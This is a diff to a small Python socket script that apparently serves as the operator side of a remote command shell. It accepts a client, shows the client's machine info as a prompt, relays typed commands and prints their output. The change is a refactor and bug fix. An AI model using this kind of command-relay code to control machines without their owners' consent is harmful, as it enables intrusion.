@@ -23,12 +23,12 @@ def socket_receive_all_data(socket_p, data_len):
     return data_received
 
 def send_command_and_receive_all_data(socket_p, command):
+    if not command:
+        return None
     socket_p.sendall(command.encode())
-    header_data = connection_socket.recv(13)
+    header_data = socket_p.recv(13)
     data_len = int(header_data.decode())
     data_received = socket_receive_all_data(socket_p, data_len)
-    if not data_received:
-        return None
     return data_received
 
 
@@ -41,13 +41,13 @@ connection_socket, client_address = s.accept()
 print(f"Connection established with {client_address}")
 s.close()
 while True:
-    data = send_command_and_receive_all_data(connection_socket, "info")
-    if not data: break
-    client_info_and_current_directory = data.decode()
-    text = input(f"{client_info_and_current_directory} >  ")
-    if text == "":
-        continue
-    data = send_command_and_receive_all_data(connection_socket, text)
+    client_machine_info = send_command_and_receive_all_data(connection_socket, "info")
+    if not client_machine_info:
+        break
+    command = input(f"{client_machine_info.decode()} >  ")
+    data = send_command_and_receive_all_data(connection_socket, command)
+    if not data:
+        break
     print(data.decode())
 
 connection_socket.close()
